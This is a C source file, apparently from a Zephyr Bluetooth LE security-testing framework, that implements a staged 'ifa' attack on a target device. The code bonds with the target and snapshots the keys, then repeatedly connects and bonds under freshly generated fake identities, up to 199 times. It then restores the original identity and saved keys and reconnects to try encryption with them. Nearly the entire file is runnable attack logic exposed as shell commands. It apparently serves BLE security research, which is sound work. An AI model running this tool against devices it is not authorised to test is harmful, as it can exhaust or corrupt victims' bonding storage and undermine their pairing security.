#include "ifa.h"
#include "main.h"

#include <host/keys.h>

#include "zephyr/bluetooth/addr.h"
#include "zephyr/bluetooth/bluetooth.h"
#include "zephyr/bluetooth/conn.h"
#include "zephyr/settings/settings.h"

static bool snapshot_taken = false;
static bool id_saved = false;
//const struct shell *ifa_shell;

uint8_t old_irk[16] = {0};
bt_addr_le_t old_addr;

K_SEM_DEFINE(conn_sem, 0, 1);
K_SEM_DEFINE(disconn_sem, 0, 1);
K_SEM_DEFINE(bond_sem, 0, 1);

void bt_rpa_invalidate(void);

/* Part 1: internal functions ------------------------------------------------------------------------------------------- */
void ifa_init(const struct shell *sh){
  //ifa_shell = sh;
}

static int id_reset(uint8_t id, bt_addr_le_t *addr, uint8_t *irk){
  int err;

  if(!irk && !addr) {
    // Reseting with new random addr and irk.
    err = bt_id_reset(id, NULL, NULL);
    if(err < 0){
      shell_error(shell, "id_reset(): Identity reset failed with code %d", err);
      return err;
    }

  } else {
    // Reseting with set addr and irk.
    err = bt_id_reset(id, addr, irk);
    if(err < 0){
      shell_error(shell, "id_reset(): Identity reset failed with code %d", err);
      return err;
    }
  }
  // invalidate rpa to start new connection with new rpa (otherwise rpa might still be valid and an old RPA will be used.
  bt_rpa_invalidate();

  return 0;
}

static void get_addr_plus_irk(bt_addr_le_t *addr, uint8_t *log_irk, bool debugging) {
  char addr_str[BT_ADDR_LE_STR_LEN];
  char irk_str[17];

  bt_get_irk(BT_ID_DEFAULT, log_irk);
  bt_get_identity(BT_ID_DEFAULT, addr);

  if (debugging) {
    bt_addr_le_to_str(addr, addr_str, BT_ADDR_LE_STR_LEN);

    for (size_t i = 0; i < 16; i++) {
      sprintf(&irk_str[i * 2], "%02x", log_irk[16 - 1 - i]);
    }
    irk_str[16 * 2] = '\0';

    shell_print(shell, "Got addr: %s, and irk 0x%s ", addr_str, irk_str);
  }
}

static int ifa_connect(bt_addr_le_t *addr, struct bt_conn **conn){
  uint32_t options = 0;
  int err;
  struct bt_conn_le_create_param *create_params = BT_CONN_LE_CREATE_PARAM(options, BT_GAP_SCAN_FAST_INTERVAL, BT_GAP_SCAN_FAST_WINDOW);

  err = bt_conn_le_create(addr, create_params, BT_LE_CONN_PARAM_DEFAULT, conn);
  if (err < 0) {
    shell_print(shell, "ifa_connect(): Connection failed (%d)", err);
    return -ENOEXEC;
  }

  k_sem_take(&conn_sem, K_FOREVER);
  return 0;
}

static int ifa_securiy(struct bt_conn *conn){
  int err;

  err = bt_conn_set_security(conn, BT_SECURITY_L2);
  if (err < 0) {
    shell_error(shell, "ifa_securiy(): Setting security failed with err: %d", err);
    return err;
  }

  k_sem_take(&bond_sem, K_FOREVER); // Wait until bonding is complete
  k_sleep(K_MSEC(1000));
  return err;
}

static int ifa_unpair(uint8_t id, bt_addr_le_t *addr){
  int err;

	err = bt_unpair(id, addr);
	if (err) {
		shell_error(shell, "ifa_unpair(): Failed to clear pairing (err %d)", err);
    return err;
	}

  return err;
}

static int ifa_snapshot_take(bt_addr_le_t *addr){

  bt_keys_snapshot_take(addr);
  snapshot_taken = true;

  return 0;
}

static void ifa_stage1(bt_addr_le_t target_addr){
  struct bt_conn *conn = NULL;
  int err;

  cmd_ifa_id_save();

  ifa_connect(&target_addr, &conn);
  ifa_securiy(conn);
  ifa_snapshot_take(&target_addr);

  err = bt_conn_disconnect(conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
  if (err) {
    shell_error(shell, "Disconnection failed, reason: %d (%s)", err, bt_hci_err_to_str(err));
  }

  k_sem_take(&disconn_sem, K_FOREVER);

  ifa_unpair(BT_ID_DEFAULT, &target_addr);
  bt_conn_unref(conn);
  conn = NULL;

  shell_print(shell, "\nstage 1 complete. \n");
}

static void ifa_stage1_periph(void){

  // save ID (BDA and IRK etc. of current peripheral = DK)
  cmd_ifa_id_save();

  //check if default_conn exists (so if there is a connection between the two devices)
  if (!default_conn){
    shell_error(shell, "Connection terminated.");
  }

  // get BDA of Central
  const bt_addr_le_t *dst = bt_conn_get_dst(default_conn); // bt_conn_get_dst() returns a const, but ifa_snapshot_take() and ifa_snapshot_take() require a non-const

  // get BDA of Central as string
  char addr[BT_ADDR_LE_STR_LEN];
  bt_addr_le_to_str(dst, addr, sizeof(addr));

  bt_addr_le_t central_addr = *dst;   // therefor, we need to make a mutable copy of *dst

  ifa_snapshot_take(&central_addr);

  int err = bt_conn_disconnect(default_conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
  if (err) {
    shell_error(shell, "Disconnection failed (err %d)", err);
  }

  k_sem_take(&disconn_sem, K_FOREVER);

  ifa_unpair(BT_ID_DEFAULT, &central_addr);
  shell_print(shell, "\nstage 1 with %s complete. \n", addr);
}

static void ifa_stage2(bt_addr_le_t target_addr, int n){
  struct bt_conn *conn = NULL;
  int err;

  for(int i = 0; i < n; i++){
    id_reset(BT_ID_DEFAULT, NULL, NULL);

    ifa_connect(&target_addr, &conn);
    if (!conn) {
        shell_error(shell, "Failed to establish connection. Skipping iteration.");
        shell_error(shell, "This might indicate that the device does not allow multiple connection events in a short time frame. You should consider attempting the attack manually");
        shell_error(shell, "To get help with this call bleframework ifa_help");
        continue;
    }

    ifa_securiy(conn);

    err = bt_conn_disconnect(conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
    if (err) {
      shell_error(shell, "Disconnection failed, reason: %d (%s)", err, bt_hci_err_to_str(err));
    }

    k_sem_take(&disconn_sem, K_FOREVER);

    ifa_unpair(BT_ID_DEFAULT, &target_addr);
    bt_conn_unref(conn);
    conn = NULL;

    shell_print(shell, "fake id connection event: %d completed\n", (i+1));
  }
  shell_print(shell, "stage 2 complete. \n");
}

static void ifa_stage2_1_periph(void){
    id_reset(BT_ID_DEFAULT, NULL, NULL);
    shell_print(shell, "stage 2.1 completed. \n");

    w_advertising_start();
}

static void ifa_stage2_2_periph(void){

    //check if default_conn exists (so if there is a connection between the two devices)
    if (!default_conn){
      shell_error(shell, "Connection terminated.");
    }

    const bt_addr_le_t *dst = bt_conn_get_dst(default_conn); // bt_conn_get_dst() returns a const, but ifa_snapshot_take() and ifa_snapshot_take() require a non-const

    // get BDA of Central as string
    char addr[BT_ADDR_LE_STR_LEN];
    bt_addr_le_to_str(dst, addr, sizeof(addr));

    bt_addr_le_t central_addr = *dst;   // therefor, we need to make a mutable copy of *dst

    int err = bt_conn_disconnect(default_conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
    if (err) {
      shell_error(shell, "Disconnection failed (err %d)", err);
    }

    k_sem_take(&disconn_sem, K_FOREVER);

    ifa_unpair(BT_ID_DEFAULT, &central_addr);

    shell_print(shell, "\nstage 2.2 with %s complete. \n", addr);
}

static void ifa_stage3(void){
  int err;

  cmd_ifa_id_restore();
  k_sleep(K_MSEC(200));

  cmd_ifa_snapshot_restore();
  k_sleep(K_MSEC(200));

	err = bt_disable();
	if (err) {
		shell_error(shell, "Bluetooth disable failed (err %d)\n", err);
	}
	shell_print(shell, "Bluetooth disabled\n");

	err = bt_enable(NULL);
	if (err) {
		shell_error(shell, "Bluetooth init failed (err %d)\n", err);
	}
	shell_print(shell,"Bluetooth re-enabled\n");

	err = settings_load();
  if(err < 0){
    shell_error(shell, "Loading settings failed with err: %d\n", err);
    shell_print(shell, "continuing anyways\n");
  } else {
	  shell_print(shell,"Settings loaded\n");
  }

  shell_print(shell, "\nstage 3 complete. \n");
}

static void ifa_stage4(bt_addr_le_t target_addr){
  struct bt_conn *conn = NULL;

  ifa_connect(&target_addr, &conn);
  ifa_securiy(conn);

  shell_print(shell, "\nstage 4 complete. \n");
}


/* Part 2: exposed functions --------------------------------------------------------------------------------------------- */

int cmd_reset(const struct shell *sh, size_t argc, char *argv[]){
  uint8_t id;
  id = atoi(argv[1]);

  id_reset(id, NULL, NULL);
  return id;
}

int cmd_ifa_id_save(){
  shell_print(shell, "saving address");
  get_addr_plus_irk(&old_addr, old_irk, false);

  id_saved = true;
  return 0;
}

int cmd_ifa_id_restore(){
  if(id_saved) {
    id_reset(BT_ID_DEFAULT, &old_addr, old_irk);
    shell_print(shell, "id reset to old values");
    return 0;
  }

  shell_error(shell, "id_restore no id to restore");
  return  -1;
}

int cmd_ifa_snapshot_take(const struct shell *sh, size_t argc, char *argv[]){
  bt_addr_le_t addr = *BT_ADDR_LE_ANY;
  int err;

	err = bt_addr_le_from_str(argv[1], argv[2], &addr);
  if (err < 0) {
  	shell_error(sh, "Invalid peer address (err %d)\n", err);
  	return err;
  }

  ifa_snapshot_take(&addr);

  return 0;
}

int cmd_ifa_snapshot_restore(){
  if(snapshot_taken) {
    bt_keys_snapshot_restore();
    return 0;
  }

  shell_error(shell, "snapshot_restore() no snapshot to restore");
  return  -1;
}

int cmd_ifa_stage1(const struct shell *sh, size_t argc, char *argv[]){
  int err;
  bt_addr_le_t target_addr = *BT_ADDR_LE_ANY;

	err = bt_addr_le_from_str(argv[1], argv[2], &target_addr);
  if (err < 0) {
  	shell_error(sh, "Invalid peer address (err %d)\n", err);
  	return err;
  }

  ifa_stage1(target_addr);

  return 0;
}

int cmd_ifa_stage1_periph(const struct shell *sh){

  ifa_stage1_periph();

  return 0;
}

int cmd_ifa_stage2(const struct shell *sh, size_t argc, char *argv[]){
  int n;
  int err;
  bt_addr_le_t target_addr = *BT_ADDR_LE_ANY;

	err = bt_addr_le_from_str(argv[1], argv[2], &target_addr);
  if (err < 0) {
  	shell_error(sh, "Invalid peer address (err %d)\n", err);
  	return err;
  }

  n = atoi(argv[3]);
  if(n <= 0 || n > 200){
    shell_error(sh, "n must be between greater than 0 and smaller than 200\n");
  	return -1;
  }

  ifa_stage2(target_addr, n);

  return 0;
}

int cmd_ifa_stage2_1_periph(const struct shell *sh){

  ifa_stage2_1_periph();

  return 0;
}

int cmd_ifa_stage2_2_periph(const struct shell *sh){

  ifa_stage2_2_periph();

  return 0;
}

int cmd_ifa_stage3(const struct shell *sh, size_t argc, char *argv[]){

  ifa_stage3();

  return 0;
}

int cmd_ifa_stage4(const struct shell *sh, size_t argc, char *argv[]){
  int err;
  bt_addr_le_t target_addr = *BT_ADDR_LE_ANY;

	err = bt_addr_le_from_str(argv[1], argv[2], &target_addr);
  if (err < 0) {
  	shell_error(sh, "Invalid peer address (err %d)\n", err);
  	return err;
  }

  ifa_stage4(target_addr);

  return 0;
}

int cmd_ifa(const struct shell *sh, size_t argc, char *argv[]){
  int n;
  int err = 0;
  bt_addr_le_t target_addr = *BT_ADDR_LE_ANY;

	err = bt_addr_le_from_str(argv[1], argv[2], &target_addr);
  if (err < 0) {
  	shell_error(sh, "Invalid peer address (err %d)\n", err);
  	return err;
  }

  n = atoi(argv[3]);
  if(n <= 0 || n >= 200){
    shell_error(sh, "n must be 0 < n < 200\n");
  	return -1;
  }

  /* -------------------------------------------------------------------------------------------------------------------------------------*/

  /* stage 1
   * 1. Saving id
   * 2. Connecting
   * 3. pairing with bonding flag (bonding)
   * 4. taking snapshot of key_pool
   * 5. unpairing to ensure that the connection is really disconnected and bonding information is correctly removed. This can be changed.
  */

  ifa_stage1(target_addr);

  /* -------------------------------------------------------------------------------------------------------------------------------------*/

  /* stage 2
   * loop:
   *  1. reset identity
   *  2. connect with new identity
   *  3. pairing with bonding flag (with new identity)
   *  4. unpair to ensure that the connection si really disconnected and bonding information is correctly removed.
   * end_loop
  */

  ifa_stage2(target_addr, n);

  /* -------------------------------------------------------------------------------------------------------------------------------------*/

  /* stage 3
   * 1. restore identity
   * 2. restore the snapshot and save its content to storage
   * 3. disable bluetooth
   * 4. re-enable bluetooth
   * 5. load settings and with it the snapshotted keys from storage
  */

  ifa_stage3();
  k_sleep(K_SECONDS(3));

  /* -------------------------------------------------------------------------------------------------------------------------------------*/

  /* stage 4
   * 1. connect with old id
   * 2. try to establish an encryption with old keys
   */
  ifa_stage4(target_addr);

  return err;

}